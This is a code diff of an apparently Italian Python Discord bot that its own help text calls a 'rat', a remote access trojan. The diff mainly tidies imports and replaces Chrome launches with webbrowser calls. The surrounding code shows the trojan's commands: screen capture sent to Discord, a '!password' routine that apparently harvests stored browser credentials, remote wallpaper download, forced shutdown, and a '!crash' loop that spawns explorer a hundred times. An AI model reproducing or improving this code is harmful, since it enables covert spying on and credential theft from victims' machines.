@@ -2,6 +2,7 @@ import discord
 import os
 import pyautogui
 from PIL import Image
+import webbrowser
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -27,12 +28,10 @@ async def on_message(message):
     if message.author == client.user:
         return
     if message.content.startswith('!chrome'):
-        import os
         await message.channel.send('fatto (forse)!')
         os.system('"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"')
         await message.channel.send("Fatto (forse) :skull:")
     if message.content.startswith('!screen'):
-        import os
         myScreenshot = pyautogui.screenshot()
         user = os.getlogin()
         myScreenshot.save(f"C:\\Users\\{user}\\Music\\Screenshot.png")
@@ -40,7 +39,6 @@ async def on_message(message):
         await message.channel.send(file=myfile)
         await message.channel.send("Fatto (dovrebbe esserci lo screen) :skull:")
     if message.content.startswith('!password'):
-        import os
         import json
         import base64
         import sqlite3
@@ -139,18 +137,15 @@ async def on_message(message):
         await message.channel.send(file=myfile)
         await message.channel.send("Fatto (forse) :skull:")
     if message.content.startswith('!fortnite'):
-        import os
-        os.system('"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" fortnite.com')
+        webbrowser.open("fortnite.com", new=2)
         await message.channel.send("Fatto (forse) :skull:")
     if message.content.startswith('!hanime'):
-        import os
-        os.system('"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" hanime.tv')
+        webbrowser.open("hanime.tv", new=2)
         await message.channel.send("Fatto (forse) :skull:")
     if message.content.startswith('!wallpaper'):
         link = message.content
         link2 = link.removeprefix('!wallpaper ')
         import urllib.request
-        import os
         user = os.getlogin()
         urllib.request.urlretrieve(link2, f'C:/Users/{user}/Music/ddos.jpg')
         import ctypes
@@ -160,10 +155,9 @@ async def on_message(message):
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
         await message.channel.send("Fatto (forse) :skull:")
     if message.content.startswith('!sito'):
-        import os
         link = message.content
         link2 = link.removeprefix('!sito ')
-        os.system(f'"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" {link2}')
+        webbrowser.open(link2, new=2)
         await message.channel.send("Fatto (forse) :skull:")
     if message.content.startswith('!foto0'):
         import time
@@ -213,7 +207,6 @@ async def on_message(message):
         os.system('shutdown -s')
     if message.content.startswith('!crash'):
         for x in range(100):
-            import os
             os.system('explorer')
     if message.content.startswith('!help'):
         embed = discord.Embed(title="Aiuto Della Rat", description="Tutti i comandi della rat", color=0x00e1ff)
